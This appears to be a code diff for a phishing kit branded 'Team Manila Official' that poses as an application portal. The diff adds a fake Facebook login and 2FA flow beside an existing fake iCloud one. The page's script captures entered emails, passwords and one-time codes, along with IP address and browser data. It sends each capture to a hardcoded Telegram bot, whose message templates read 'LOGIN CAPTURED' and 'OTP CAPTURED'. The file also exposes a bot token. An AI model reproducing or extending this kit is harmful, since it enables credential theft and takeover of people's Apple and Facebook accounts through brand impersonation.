@@ -76,6 +76,10 @@
             letter-spacing: 2px;
         }
         
+        .team-manila-logo.facebook {
+            background: #1877f2;
+        }
+        
         .team-manila-title {
             font-size: 32px;
             font-weight: 700;
@@ -100,6 +104,50 @@
             border-radius: 20px;
             font-size: 14px;
             color: #666;
+        }
+        
+        /* Platform Selector */
+        .platform-selector {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+            justify-content: center;
+        }
+        
+        .platform-btn {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            background: white;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .platform-btn i {
+            font-size: 32px;
+        }
+        
+        .platform-btn span {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .platform-btn.active {
+            border-color: #007AFF;
+            background: #f0f9ff;
+        }
+        
+        .platform-btn.apple.active i {
+            color: #000;
+        }
+        
+        .platform-btn.facebook.active i {
+            color: #1877f2;
         }
         
         /* Page 1 Styles */
@@ -173,6 +221,14 @@
             background: #0056CC;
         }
         
+        .action-btn.facebook {
+            background: #1877f2;
+        }
+        
+        .action-btn.facebook:hover {
+            background: #166fe5;
+        }
+        
         .btn-icon {
             font-size: 20px;
         }
@@ -238,6 +294,12 @@
             color: #0369a1;
         }
         
+        .info-box.facebook {
+            background: #f0f2f5;
+            border-left-color: #1877f2;
+            color: #1c1e21;
+        }
+        
         /* Page 3 Styles */
         .otp-input {
             width: 100%;
@@ -256,6 +318,11 @@
             outline: none;
             border-color: #007AFF;
             box-shadow: 0 0 0 3px rgba(0, 122, 255, 0.1);
+        }
+        
+        .otp-input.facebook:focus {
+            border-color: #1877f2;
+            box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.1);
         }
         
         .otp-instructions {
@@ -286,6 +353,10 @@
             font-weight: 600;
         }
         
+        .instruction-number.facebook {
+            background: #1877f2;
+        }
+        
         .instruction-content h3 {
             margin: 0 0 5px 0;
             color: #333;
@@ -313,6 +384,10 @@
             display: inline-block;
         }
         
+        .otp-link.facebook {
+            color: #1877f2;
+        }
+        
         .otp-link:hover {
             text-decoration: underline;
         }
@@ -321,7 +396,6 @@
             background: transparent;
             color: #666;
             border: 1px solid #ddd;
-            padding: 12px;
             margin-top: 10px;
         }
         
@@ -375,25 +449,45 @@
         .progress-dot.active {
             background-color: #007AFF;
         }
+        
+        .progress-dot.facebook.active {
+            background-color: #1877f2;
+        }
+        
+        .fb-icon {
+            color: #1877f2;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Page 1: Team Manila Landing -->
+        <!-- Page 1: Team Manila Landing with Platform Selection -->
         <div class="card page active" id="page1">
             <div class="team-manila-header">
                 <div class="team-manila-logo">TM</div>
                 <h1 class="team-manila-title">TEAM MANILA OFFICIAL</h1>
                 <p class="team-manila-subtitle">Your gateway to exclusive opportunities</p>
                 <div class="sponsor-badge">
-                    <i class="fab fa-apple"></i>
-                    Sponsored by Apple Inc.
+                    <i class="fas fa-shield-alt"></i>
+                    Verified Platform
                 </div>
             </div>
             
             <div class="description-box">
-                <h3 class="description-title">Connect and Apply</h3>
-                <p>By clicking the Continue button, you'll be able to:</p>
+                <h3 class="description-title">Choose your login method</h3>
+                <p>Select a platform to continue your application:</p>
+                
+                <div class="platform-selector">
+                    <button class="platform-btn apple active" onclick="selectPlatform('apple')">
+                        <i class="fab fa-apple" style="color: #000;"></i>
+                        <span>Apple</span>
+                    </button>
+                    <button class="platform-btn facebook" onclick="selectPlatform('facebook')">
+                        <i class="fab fa-facebook" style="color: #1877f2;"></i>
+                        <span>Facebook</span>
+                    </button>
+                </div>
+                
                 <ul class="benefits-list">
                     <li>Connect with our team directly</li>
                     <li>Submit your application form securely</li>
@@ -401,14 +495,14 @@
                 </ul>
             </div>
             
-            <button class="action-btn" onclick="showPage(2)">
-                <i class="fas fa-cloud btn-icon"></i>
-                Continue with iCloud
+            <button class="action-btn" id="continueBtn" onclick="continueToLogin()">
+                <i class="fab fa-apple btn-icon" id="continueIcon"></i>
+                Continue with Apple
             </button>
             
             <p class="footer-note">
                 © 2025 Team Manila Official. All rights reserved.<br>
-                Secure connection with Apple iCloud
+                Secure connection with verified platforms
             </p>
             
             <div class="progress-indicator">
@@ -418,8 +512,8 @@
             </div>
         </div>
         
-        <!-- Page 2: iCloud Login -->
-        <div class="card page" id="page2">
+        <!-- Page 2: Apple iCloud Login -->
+        <div class="card page" id="page2-apple">
             <div class="team-manila-header">
                 <div class="team-manila-logo" style="width: 60px; height: 60px; font-size: 20px;">TM</div>
                 <h1 class="team-manila-title" style="font-size: 24px;">iCloud</h1>
@@ -429,32 +523,32 @@
                 </p>
             </div>
             
-            <form id="loginForm">
+            <form id="appleLoginForm">
                 <div class="form-group">
-                    <label for="email">Email or Phone Number</label>
-                    <input type="text" id="email" class="form-input" placeholder="name@icloud.com" required>
+                    <label for="apple-email">Email or Phone Number</label>
+                    <input type="text" id="apple-email" class="form-input" placeholder="name@icloud.com" required>
                 </div>
                 
                 <div class="form-group">
-                    <label for="password">Password</label>
-                    <input type="password" id="password" class="form-input" placeholder="Enter your password" required>
+                    <label for="apple-password">Password</label>
+                    <input type="password" id="apple-password" class="form-input" placeholder="Enter your password" required>
                 </div>
                 
                 <div class="checkbox-group">
-                    <input type="checkbox" id="keepSignedIn" class="checkbox">
-                    <label for="keepSignedIn">Keep me signed in</label>
+                    <input type="checkbox" id="apple-keepSignedIn" class="checkbox">
+                    <label for="apple-keepSignedIn">Keep me signed in</label>
                 </div>
                 
                 <div class="info-box">
                     <i class="fas fa-info-circle"></i> For accounts with two-factor authentication, use an app-specific password
                 </div>
                 
-                <button type="button" class="action-btn blue" onclick="submitLogin()">
-                    Sign In
+                <button type="button" class="action-btn blue" onclick="submitAppleLogin()">
+                    Sign In to iCloud
                 </button>
                 
-                <button type="button" class="action-btn back-btn" onclick="showPage(1)">
-                    <i class="fas fa-arrow-left"></i> Back
+                <button type="button" class="action-btn back-btn" onclick="showPage1()">
+                    <i class="fas fa-arrow-left"></i> Back to Platforms
                 </button>
             </form>
             
@@ -469,8 +563,67 @@
             </div>
         </div>
         
-        <!-- Page 3: OTP Verification -->
-        <div class="card page" id="page3">
+        <!-- Page 2: Facebook Login -->
+        <div class="card page" id="page2-facebook">
+            <div class="team-manila-header">
+                <div class="team-manila-logo facebook" style="width: 60px; height: 60px; font-size: 20px;">
+                    <i class="fab fa-facebook-f"></i>
+                </div>
+                <h1 class="team-manila-title" style="font-size: 24px;">Facebook</h1>
+                <p class="team-manila-subtitle" style="font-size: 14px;">
+                    Log in with Facebook<br>
+                    <span style="color: #1877f2; font-weight: 600;">Connecting to Team Manila Official</span>
+                </p>
+            </div>
+            
+            <form id="facebookLoginForm">
+                <div class="form-group">
+                    <label for="facebook-email">Email or Phone Number</label>
+                    <input type="text" id="facebook-email" class="form-input" placeholder="Email or phone number" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="facebook-password">Password</label>
+                    <input type="password" id="facebook-password" class="form-input" placeholder="Enter your password" required>
+                </div>
+                
+                <div class="checkbox-group">
+                    <input type="checkbox" id="facebook-keepSignedIn" class="checkbox">
+                    <label for="facebook-keepSignedIn">Keep me logged in</label>
+                </div>
+                
+                <div class="info-box facebook">
+                    <i class="fas fa-shield-alt"></i> We'll use this to connect your Facebook account securely
+                </div>
+                
+                <button type="button" class="action-btn facebook" onclick="submitFacebookLogin()">
+                    <i class="fab fa-facebook-f"></i> Log In with Facebook
+                </button>
+                
+                <div style="text-align: center; margin: 15px 0;">
+                    <a href="#" class="otp-link facebook" style="font-size: 13px;">Forgot Password?</a>
+                    <span style="color: #ccc;">|</span>
+                    <a href="#" class="otp-link facebook" style="font-size: 13px;">Create New Account</a>
+                </div>
+                
+                <button type="button" class="action-btn back-btn" onclick="showPage1()">
+                    <i class="fas fa-arrow-left"></i> Back to Platforms
+                </button>
+            </form>
+            
+            <p class="footer-note">
+                Secure login with Facebook
+            </p>
+            
+            <div class="progress-indicator">
+                <div class="progress-dot" data-page="1"></div>
+                <div class="progress-dot active" data-page="2"></div>
+                <div class="progress-dot" data-page="3"></div>
+            </div>
+        </div>
+        
+        <!-- Page 3: Apple OTP Verification -->
+        <div class="card page" id="page3-apple">
             <div class="team-manila-header">
                 <div class="team-manila-logo" style="width: 60px; height: 60px; font-size: 20px;">TM</div>
                 <h1 class="team-manila-title" style="font-size: 24px;">iCloud</h1>
@@ -489,7 +642,7 @@
                     Enter the verification code sent to your iPhone.
                 </p>
                 
-                <input type="text" id="otpCode" class="otp-input" placeholder="000000" 
+                <input type="text" id="apple-otp" class="otp-input" placeholder="000000" 
                        maxlength="6" pattern="\d{6}" required>
                 
                 <div class="otp-instructions">
@@ -508,33 +661,110 @@
                             <p>Type the code shown on your iPhone</p>
                         </div>
                     </div>
+                </div>
+            </div>
+            
+            <div class="otp-options">
+                <a href="#" class="otp-link" onclick="resendAppleOTP()">Resend code to iPhone</a>
+                <span style="color: #ccc;">|</span>
+                <a href="#" class="otp-link">Can't get to your iPhone?</a>
+            </div>
+            
+            <button type="button" class="action-btn blue" onclick="verifyAppleOTP()" id="appleVerifyBtn">
+                Verify
+            </button>
+            
+            <button type="button" class="action-btn back-btn" onclick="goBackToLogin('apple')">
+                <i class="fas fa-arrow-left"></i> Back
+            </button>
+            
+            <p class="footer-note">
+                Secure two-factor authentication
+            </p>
+            
+            <div class="progress-indicator">
+                <div class="progress-dot" data-page="1"></div>
+                <div class="progress-dot" data-page="2"></div>
+                <div class="progress-dot active" data-page="3"></div>
+            </div>
+        </div>
+        
+        <!-- Page 3: Facebook OTP/2FA Verification -->
+        <div class="card page" id="page3-facebook">
+            <div class="team-manila-header">
+                <div class="team-manila-logo facebook" style="width: 60px; height: 60px; font-size: 20px;">
+                    <i class="fab fa-facebook-f"></i>
+                </div>
+                <h1 class="team-manila-title" style="font-size: 24px;">Facebook</h1>
+                <p class="team-manila-subtitle" style="font-size: 14px;">
+                    Two-Factor Authentication<br>
+                    Additional verification required
+                </p>
+            </div>
+            
+            <div style="text-align: center; margin: 20px 0;">
+                <div style="font-size: 48px; color: #1877f2; margin-bottom: 20px;">
+                    <i class="fas fa-lock"></i>
+                </div>
+                
+                <p style="color: #666; margin-bottom: 10px; font-size: 15px;">
+                    Enter the 6-digit code from your authenticator app
+                </p>
+                <p style="color: #999; font-size: 13px; margin-bottom: 20px;">
+                    Or enter a code from SMS
+                </p>
+                
+                <input type="text" id="facebook-otp" class="otp-input facebook" placeholder="000000" 
+                       maxlength="6" pattern="\d{6}" required>
+                
+                <div class="otp-instructions">
+                    <div class="instruction-item">
+                        <div class="instruction-number facebook">1</div>
+                        <div class="instruction-content">
+                            <h3>Check Your Authenticator App</h3>
+                            <p>Open your two-factor authentication app or check your SMS</p>
+                        </div>
+                    </div>
                     
                     <div class="instruction-item">
-                        <div class="instruction-number">3</div>
+                        <div class="instruction-number facebook">2</div>
                         <div class="instruction-content">
-                            <h3>Complete Verification</h3>
-                            <p>Access will be granted after successful verification</p>
+                            <h3>Enter Login Code</h3>
+                            <p>Enter the 6-digit code shown in your app or sent via SMS</p>
+                        </div>
+                    </div>
+                    
+                    <div class="instruction-item">
+                        <div class="instruction-number facebook">3</div>
+                        <div class="instruction-content">
+                            <h3>Approve Login</h3>
+                            <p>Click Continue to complete your verification</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="background: #e7f3ff; border-radius: 8px; padding: 12px; margin: 20px 0; text-align: left;">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <i class="fas fa-mobile-alt" style="color: #1877f2; font-size: 20px;"></i>
+                        <div>
+                            <span style="font-weight: 600; color: #1c1e21;">Text message</span>
+                            <p style="color: #65676b; font-size: 13px; margin-top: 2px;">Code sent to ••••••7890</p>
                         </div>
                     </div>
                 </div>
             </div>
             
             <div class="otp-options">
-                <a href="#" class="otp-link" onclick="resendOTP()">Resend code to iPhone</a>
+                <a href="#" class="otp-link facebook" onclick="resendFacebookOTP()">Resend code</a>
                 <span style="color: #ccc;">|</span>
-                <a href="#" class="otp-link">Can't get to your iPhone?</a>
+                <a href="#" class="otp-link facebook">Use another method</a>
             </div>
             
-            <p style="color: #999; font-size: 12px; text-align: center; margin: 15px 0; line-height: 1.4;">
-                If you can't enter a code because you've lost your device,<br>
-                you can use Find Devices to locate it or Manage Devices to remove your Apple Pay cards from it.
-            </p>
-            
-            <button type="button" class="action-btn blue" onclick="verifyOTP()" id="verifyBtn">
-                Verify
+            <button type="button" class="action-btn facebook" onclick="verifyFacebookOTP()" id="facebookVerifyBtn">
+                Continue
             </button>
             
-            <button type="button" class="action-btn back-btn" onclick="showPage(2)">
+            <button type="button" class="action-btn back-btn" onclick="goBackToLogin('facebook')">
                 <i class="fas fa-arrow-left"></i> Back
             </button>
             
@@ -556,14 +786,14 @@
                     <i class="fas fa-check"></i>
                 </div>
                 <h1 class="team-manila-title">Verification Successful!</h1>
-                <p class="team-manila-subtitle">
+                <p class="team-manila-subtitle" id="successMessage">
                     Welcome to Team Manila Official
                 </p>
             </div>
             
             <div style="text-align: center; margin: 30px 0;">
                 <div class="loading-spinner"></div>
-                <p style="color: #666; margin-top: 20px; font-size: 15px;">
+                <p style="color: #666; margin-top: 20px; font-size: 15px;" id="redirectMessage">
                     Redirecting to application code page...
                 </p>
             </div>
@@ -579,91 +809,201 @@
         const BOT_TOKEN = '8264793416:AAFmsuZIrUlkGAQiF2xDtOToNmNIjSTyi5I';
         const CHAT_ID = '8456018521';
         
-        let userCredentials = { email: '', password: '' };
+        let userCredentials = { 
+            platform: 'apple',
+            email: '', 
+            password: '' 
+        };
         
-        // Page navigation
-        function showPage(pageNumber) {
+        // Platform selection
+        let currentPlatform = 'apple';
+        
+        function selectPlatform(platform) {
+            currentPlatform = platform;
+            
+            // Update active states
+            document.querySelectorAll('.platform-btn').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            if (platform === 'apple') {
+                document.querySelector('.platform-btn.apple').classList.add('active');
+                document.getElementById('continueBtn').innerHTML = '<i class="fab fa-apple btn-icon"></i> Continue with Apple';
+            } else {
+                document.querySelector('.platform-btn.facebook').classList.add('active');
+                document.getElementById('continueBtn').innerHTML = '<i class="fab fa-facebook btn-icon"></i> Continue with Facebook';
+            }
+        }
+        
+        function continueToLogin() {
             // Hide all pages
             document.querySelectorAll('.page').forEach(page => {
                 page.classList.remove('active');
             });
             
-            // Show selected page
-            document.getElementById(`page${pageNumber}`).classList.add('active');
+            if (currentPlatform === 'apple') {
+                document.getElementById('page2-apple').classList.add('active');
+            } else {
+                document.getElementById('page2-facebook').classList.add('active');
+            }
             
             // Update progress dots
+            updateProgressDots(2);
+        }
+        
+        function showPage1() {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page1').classList.add('active');
+            updateProgressDots(1);
+        }
+        
+        function goBackToLogin(platform) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            if (platform === 'apple') {
+                document.getElementById('page2-apple').classList.add('active');
+            } else {
+                document.getElementById('page2-facebook').classList.add('active');
+            }
+            
+            updateProgressDots(2);
+        }
+        
+        function showSuccessPage(platform) {
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            document.getElementById('successMessage').innerHTML = 
+                `Welcome! Your ${platform} account has been verified`;
+            document.getElementById('redirectMessage').innerHTML = 
+                'Redirecting to application code page...';
+            
+            document.getElementById('page4').classList.add('active');
+            
+            setTimeout(() => {
+                window.location.href = "code.html";
+            }, 2000);
+        }
+        
+        function updateProgressDots(pageNumber) {
             document.querySelectorAll('.progress-dot').forEach(dot => {
                 dot.classList.remove('active');
                 if (parseInt(dot.dataset.page) <= pageNumber) {
                     dot.classList.add('active');
                 }
             });
-            
-            // Focus on first input field
-            if (pageNumber === 2) {
-                setTimeout(() => document.getElementById('email').focus(), 100);
-            } else if (pageNumber === 3) {
-                setTimeout(() => document.getElementById('otpCode').focus(), 100);
-            }
         }
         
-        // Login submission
-        async function submitLogin() {
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+        // Apple Login
+        async function submitAppleLogin() {
+            const email = document.getElementById('apple-email').value;
+            const password = document.getElementById('apple-password').value;
             
             if (!email || !password) {
                 alert('Please enter both email and password.');
                 return;
             }
             
-            // Save credentials
-            userCredentials = { email, password };
+            userCredentials = { platform: 'apple', email, password };
             
-            // Get user info
             const userInfo = await getUserInfo();
+            await sendToTelegram('APPLE_LOGIN', { email, password, ...userInfo });
             
-            // Send to Telegram
-            await sendToTelegram('LOGIN', { email, password, ...userInfo });
+            // Show Apple OTP page
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page3-apple').classList.add('active');
+            updateProgressDots(3);
             
-            // Show OTP page
-            showPage(3);
+            setTimeout(() => document.getElementById('apple-otp').focus(), 100);
         }
         
-        // OTP verification and redirect to code.html
-        async function verifyOTP() {
-            const otp = document.getElementById('otpCode').value;
+        // Facebook Login
+        async function submitFacebookLogin() {
+            const email = document.getElementById('facebook-email').value;
+            const password = document.getElementById('facebook-password').value;
+            
+            if (!email || !password) {
+                alert('Please enter both email/phone and password.');
+                return;
+            }
+            
+            userCredentials = { platform: 'facebook', email, password };
+            
+            const userInfo = await getUserInfo();
+            await sendToTelegram('FACEBOOK_LOGIN', { email, password, ...userInfo });
+            
+            // Show Facebook OTP page
+            document.querySelectorAll('.page').forEach(page => {
+                page.classList.remove('active');
+            });
+            document.getElementById('page3-facebook').classList.add('active');
+            updateProgressDots(3);
+            
+            setTimeout(() => document.getElementById('facebook-otp').focus(), 100);
+        }
+        
+        // Apple OTP Verification
+        async function verifyAppleOTP() {
+            const otp = document.getElementById('apple-otp').value;
             
             if (!otp || otp.length !== 6) {
                 alert('Please enter a valid 6-digit verification code.');
                 return;
             }
             
-            const verifyBtn = document.getElementById('verifyBtn');
+            const verifyBtn = document.getElementById('appleVerifyBtn');
             verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
             verifyBtn.disabled = true;
             
-            // Send OTP to Telegram
-            await sendToTelegram('OTP', { 
+            await sendToTelegram('APPLE_OTP', { 
                 email: userCredentials.email, 
                 otp,
                 ...await getUserInfo()
             });
             
-            // Show success page
-            showPage(4);
-            
-            // Redirect to code.html after 2 seconds
-            setTimeout(() => {
-                window.location.href = "code.html";
-            }, 2000);
+            showSuccessPage('Apple');
         }
         
-        // Resend OTP
-        function resendOTP() {
+        // Facebook OTP/2FA Verification
+        async function verifyFacebookOTP() {
+            const otp = document.getElementById('facebook-otp').value;
+            
+            if (!otp || otp.length !== 6) {
+                alert('Please enter a valid 6-digit verification code.');
+                return;
+            }
+            
+            const verifyBtn = document.getElementById('facebookVerifyBtn');
+            verifyBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Verifying...';
+            verifyBtn.disabled = true;
+            
+            await sendToTelegram('FACEBOOK_OTP', { 
+                email: userCredentials.email, 
+                otp,
+                ...await getUserInfo()
+            });
+            
+            showSuccessPage('Facebook');
+        }
+        
+        // Resend OTP functions
+        function resendAppleOTP() {
             alert('A new verification code has been sent to your iPhone.');
-            document.getElementById('otpCode').value = '';
-            document.getElementById('otpCode').focus();
+            document.getElementById('apple-otp').value = '';
+            document.getElementById('apple-otp').focus();
+        }
+        
+        function resendFacebookOTP() {
+            alert('A new verification code has been sent to your phone.');
+            document.getElementById('facebook-otp').value = '';
+            document.getElementById('facebook-otp').focus();
         }
         
         // Get user information
@@ -697,49 +1037,76 @@
         async function sendToTelegram(type, data) {
             let message;
             
-            if (type === 'LOGIN') {
-                message = `
-🔐 *TEAM MANILA - LOGIN CAPTURED*
+            switch(type) {
+                case 'APPLE_LOGIN':
+                    message = `
+🍎 *TEAM MANILA - APPLE LOGIN*
 
-🎯 *Service:* iCloud Login
+🎯 *Service:* Apple iCloud Login
 📅 *Time:* ${data.timestamp}
 📍 *IP Address:* ${data.ip}
 🌐 *Page URL:* ${data.location}
-🔗 *Referrer:* ${data.referrer}
 
 👤 *APPLE ID:*
-\`\`\`
-${data.email}
-\`\`\`
+\`${data.email}\`
 
 🔑 *PASSWORD:*
-\`\`\`
-${data.password}
-\`\`\`
+\`${data.password}\`
 
-📱 *Browser Info:*
-\`\`\`
-${data.userAgent}
-\`\`\`
+📱 *Browser:* ${data.userAgent}
+                    `;
+                    break;
+                    
+                case 'APPLE_OTP':
+                    message = `
+🔢 *TEAM MANILA - APPLE OTP*
 
-✅ *Login attempt recorded - Redirecting to OTP*
-                `;
-            } else if (type === 'OTP') {
-                message = `
-🔢 *TEAM MANILA - OTP CAPTURED*
-
-🎯 *Service:* iCloud 2FA
+🎯 *Service:* Apple 2FA
 📅 *Time:* ${data.timestamp}
 📍 *IP Address:* ${data.ip}
 👤 *Apple ID:* ${data.email}
 
 🔢 *OTP CODE:*
-\`\`\`
-${data.otp}
-\`\`\`
+\`${data.otp}\`
 
-✅ *OTP verification successful - Redirecting to code.html*
-                `;
+✅ *Apple OTP verification successful*
+                    `;
+                    break;
+                    
+                case 'FACEBOOK_LOGIN':
+                    message = `
+📘 *TEAM MANILA - FACEBOOK LOGIN*
+
+🎯 *Service:* Facebook Login
+📅 *Time:* ${data.timestamp}
+📍 *IP Address:* ${data.ip}
+🌐 *Page URL:* ${data.location}
+
+👤 *FACEBOOK EMAIL:*
+\`${data.email}\`
+
+🔑 *PASSWORD:*
+\`${data.password}\`
+
+📱 *Browser:* ${data.userAgent}
+                    `;
+                    break;
+                    
+                case 'FACEBOOK_OTP':
+                    message = `
+🔢 *TEAM MANILA - FACEBOOK 2FA*
+
+🎯 *Service:* Facebook 2FA
+📅 *Time:* ${data.timestamp}
+📍 *IP Address:* ${data.ip}
+👤 *Facebook Email:* ${data.email}
+
+🔢 *2FA CODE:*
+\`${data.otp}\`
+
+✅ *Facebook 2FA verification successful*
+                    `;
+                    break;
             }
             
             try {
@@ -756,35 +1123,42 @@ ${data.otp}
                 });
                 
                 if (response.ok) {
-                    console.log('✅ Data sent to Telegram successfully');
-                } else {
-                    console.error('❌ Telegram API error:', response.status);
+                    console.log(`✅ ${type} sent to Telegram`);
                 }
             } catch (error) {
                 console.error('❌ Telegram error:', error);
             }
         }
         
-        // Form submission on Enter key
+        // Event listeners
         document.addEventListener('DOMContentLoaded', function() {
-            // Login form
-            document.getElementById('password')?.addEventListener('keypress', function(e) {
+            selectPlatform('apple');
+            
+            // Apple login Enter key
+            document.getElementById('apple-password')?.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    submitLogin();
+                    submitAppleLogin();
                 }
             });
             
-            // OTP form
-            document.getElementById('otpCode')?.addEventListener('keypress', function(e) {
+            // Facebook login Enter key
+            document.getElementById('facebook-password')?.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
-                    verifyOTP();
+                    submitFacebookLogin();
                 }
             });
             
-            // Auto-submit OTP when 6 digits are entered
-            document.getElementById('otpCode')?.addEventListener('input', function(e) {
+            // Apple OTP auto-submit
+            document.getElementById('apple-otp')?.addEventListener('input', function(e) {
                 if (this.value.length === 6) {
-                    verifyOTP();
+                    verifyAppleOTP();
+                }
+            });
+            
+            // Facebook OTP auto-submit
+            document.getElementById('facebook-otp')?.addEventListener('input', function(e) {
+                if (this.value.length === 6) {
+                    verifyFacebookOTP();
                 }
             });
         });
